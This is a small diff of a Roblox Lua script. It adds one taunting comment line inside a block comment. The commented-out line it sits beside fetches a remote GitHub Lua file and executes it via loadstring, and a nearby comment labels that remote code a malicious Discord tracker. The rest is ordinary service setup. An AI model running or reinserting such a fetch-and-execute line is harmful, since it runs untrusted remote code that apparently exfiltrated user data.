@@ -1,5 +1,6 @@
 --[[loadstring(game:HttpGet("https://raw.githubusercontent.com/Patheticcs/soluna/refs/heads/main/src/api/tracker.lua", true))()
 Was maliciously a discord bot hooker
+- You deleted the github, mesmerize🥀
 ]]
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
